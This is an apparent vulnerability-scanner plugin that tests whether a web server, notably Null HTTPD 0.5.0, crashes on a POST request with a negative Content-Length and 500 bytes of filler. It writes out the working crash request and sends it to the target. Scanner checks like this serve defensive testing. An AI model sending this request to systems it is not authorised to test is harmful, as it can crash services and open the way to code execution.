# SPDX-FileCopyrightText: 2002 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11183");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("HTTP negative Content-Length buffer overflow");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("Copyright (C) 2002 Michel Arboi");
  script_family("Gain a shell remotely");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Upgrade your web server.");

  script_tag(name:"summary", value:"The web server was crashed by sending an invalid POST
  HTTP request with a negative Content-Length field.");

  script_tag(name:"impact", value:"An attacker may exploit this flaw to disable the service or
  even execute arbitrary code on the system.");

  script_tag(name:"affected", value:"Null HTTPD 0.5.0 is known to be affected. Other versions or
  products might be affected as well.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:80);

if(http_is_dead(port:port))
  exit(0);

soc = http_open_socket(port);
if(! soc)
  exit(0);

# Null HTTPD attack
req = string("POST / HTTP/1.0\r\n",
             "Host: ", get_host_ip(), "\r\n",
             "Content-Length: -800\r\n\r\n", crap(500), "\r\n");
send(socket:soc, data:req);
http_recv(socket:soc);
http_close_socket(soc);

if(http_is_dead(port:port)) {
  security_message(port:port);
  exit(0);
}

exit(99);
